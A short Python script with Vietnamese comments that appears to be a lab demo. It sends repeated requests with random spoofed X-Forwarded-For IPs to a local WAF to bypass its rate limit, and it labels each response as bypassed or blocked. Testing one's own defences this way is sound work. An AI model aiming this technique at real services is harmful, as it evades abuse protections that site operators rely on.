import requests
import random

WAF_URL = "http://127.0.0.1:5000/search?q=hello"

print("[*] Bắt đầu chiến dịch vượt mặt Rate Limit...")

for i in range(1, 15): # Gửi 14 request liên tục (Vượt xa mốc 5 của Rate Limit)
    # Tạo ra một IP ngẫu nhiên mỗi lần gửi (VD: 192.168.1.5, 10.0.0.9...)
    fake_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.1.1"
    
    # Nhét IP giả vào Header X-Forwarded-For
    headers = {
        "X-Forwarded-For": fake_ip
    }
    
    # Gửi request tấn công đến WAF
    response = requests.get(WAF_URL, headers=headers)
    
    # In kết quả
    if response.status_code == 200:
        print(f"Lần {i:02d} | IP Giả: {fake_ip:15} | Kết quả: THÀNH CÔNG (Bypass)")
    elif response.status_code == 429:
        print(f"Lần {i:02d} | IP Giả: {fake_ip:15} | Kết quả: BỊ CHẶN (Rate Limit)")